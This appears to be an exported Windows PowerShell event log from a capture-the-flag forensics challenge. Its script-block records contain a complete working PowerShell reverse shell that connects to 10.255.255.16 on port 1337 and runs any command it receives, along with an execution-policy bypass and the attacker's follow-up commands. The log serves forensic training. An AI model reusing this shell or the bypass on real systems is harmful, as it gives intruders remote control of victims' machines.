@@ -1,0 +1,249 @@
+<?xml version="1.1" encoding="utf-8" standalone="yes" ?>
+
+<Events>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">40961</EventID>
+<Version>1</Version>
+<Level>4</Level>
+<Task>4</Task>
+<Opcode>1</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:50.917421"></TimeCreated>
+<EventRecordID>1464</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0000-5a11-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="3768"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData></EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">53504</EventID>
+<Version>1</Version>
+<Level>4</Level>
+<Task>111</Task>
+<Opcode>10</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:50.978559"></TimeCreated>
+<EventRecordID>1465</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0000-5a11-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="3092"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="param1">3788</Data>
+<Data Name="param2">DefaultAppDomain</Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">40962</EventID>
+<Version>1</Version>
+<Level>4</Level>
+<Task>4</Task>
+<Opcode>2</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:51.004246"></TimeCreated>
+<EventRecordID>1466</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0000-5a11-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="3768"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData></EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>3</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:51.025818"></TimeCreated>
+<EventRecordID>1467</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0001-1f13-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; &amp; 'D:\PAYLOAD.PS1'</Data>
+<Data Name="ScriptBlockId">fab1cf7c-71d9-40fc-8f4d-6440a06f856f</Data>
+<Data Name="Path"></Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>3</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:51.426077"></TimeCreated>
+<EventRecordID>1468</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0000-5f11-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">do {
+    Start-Sleep -Seconds 1
+     try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
+    } catch {}
+} until ($TCPClient.Connected)
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+function WriteToStream ($String) {
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+    $StreamWriter.Write($String + 'SHELL&gt; ')
+    $StreamWriter.Flush()
+}
+WriteToStream "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n"
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    $Output = try {
+            Invoke-Expression $Command 2&gt;&amp;1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+    WriteToStream ($Output)
+}
+$StreamWriter.Close()
+</Data>
+<Data Name="ScriptBlockId">2354b750-2422-42a3-b8c2-4fd7fd36dfe7</Data>
+<Data Name="Path">D:\PAYLOAD.PS1</Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>5</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:52.617893"></TimeCreated>
+<EventRecordID>1469</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0001-3c13-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">function WriteToStream ($String) {
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+    $StreamWriter.Write($String + 'SHELL&gt; ')
+    $StreamWriter.Flush()
+}</Data>
+<Data Name="ScriptBlockId">89ac7f73-0404-45e5-98cf-589599dfaed3</Data>
+<Data Name="Path">D:\PAYLOAD.PS1</Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>5</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:26:52.627636"></TimeCreated>
+<EventRecordID>1470</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0000-6911-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">{0}</Data>
+<Data Name="ScriptBlockId">953dd59a-c6f4-4d1c-b1f8-00751805b65b</Data>
+<Data Name="Path">D:\PAYLOAD.PS1</Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>5</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:27:16.205599"></TimeCreated>
+<EventRecordID>1471</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0001-5b13-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">whoami</Data>
+<Data Name="ScriptBlockId">3d8e4101-40e0-4913-a430-c5c457d3ab0f</Data>
+<Data Name="Path"></Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>5</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:27:18.186661"></TimeCreated>
+<EventRecordID>1472</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0001-6013-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">dir</Data>
+<Data Name="ScriptBlockId">b518580d-c6fc-48dc-8924-89af6b9072a5</Data>
+<Data Name="Path"></Data>
+</EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
+<EventID Qualifiers="">4104</EventID>
+<Version>1</Version>
+<Level>5</Level>
+<Task>2</Task>
+<Opcode>15</Opcode>
+<Keywords>0x0000000000000000</Keywords>
+<TimeCreated SystemTime="2023-04-02 14:27:57.343948"></TimeCreated>
+<EventRecordID>1473</EventRecordID>
+<Correlation ActivityID="{f3d5bb62-656e-0001-1619-d6f36e65d901}" RelatedActivityID=""></Correlation>
+<Execution ProcessID="3788" ThreadID="748"></Execution>
+<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+<Computer>DESKTOP-AL3DV8F.fcsc.fr</Computer>
+<Security UserID="S-1-5-21-3727796838-1318123174-2233927406-1107"></Security>
+</System>
+<EventData><Data Name="MessageNumber">1</Data>
+<Data Name="MessageTotal">1</Data>
+<Data Name="ScriptBlockText">$global:?</Data>
+<Data Name="ScriptBlockId">1e3411e2-5c37-4e9a-9304-8fd0c4ec4f9c</Data>
+<Data Name="Path"></Data>
+</EventData>
+</Event>
+
+</Events>
